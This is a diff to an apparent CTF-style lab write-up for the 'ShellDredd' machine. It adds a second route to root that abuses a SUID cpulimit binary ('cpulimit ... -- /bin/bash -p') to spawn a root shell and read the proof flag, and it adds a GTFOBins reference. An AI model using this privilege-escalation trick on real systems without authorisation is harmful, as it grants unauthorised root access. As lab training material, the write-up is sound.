@@ -202,9 +202,9 @@ hannah@ShellDredd:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /de
 hannah@ShellDredd:~$ 
 ```
 
-From the list [mawk](https://gtfobins.org/gtfobins/mawk/) looks like a good choice.
+From the list [mawk](https://gtfobins.org/gtfobins/mawk/) or [cpulimit](https://gtfobins.org/gtfobins/cpulimit/) looks like a good choices.
 
-### Get the root flag
+### Get the root flag - alt #1
 
 Finally, we get the root flag
 
@@ -214,10 +214,25 @@ b<REDACTED>2
 hannah@ShellDredd:~$ 
 ```
 
+### Get the root flag - alt #2
+
+Alternatively, we can get a root shell like this
+
+```bash
+hannah@ShellDredd:~$ cpulimit -l 100 -f -- /bin/bash -p
+Process 1029 detected
+bash-5.0# id
+uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)
+bash-5.0# cat /root/proof.txt
+b<REDACTED>3
+bash-5.0# 
+```
+
 For additional information, please see the references below.
 
 ## References
 
+- [cpulimit - GTFOBins](https://gtfobins.org/gtfobins/cpulimit/)
 - [File Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
 - [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
 - [ftp - Linux manual page](https://linux.die.net/man/1/ftp)
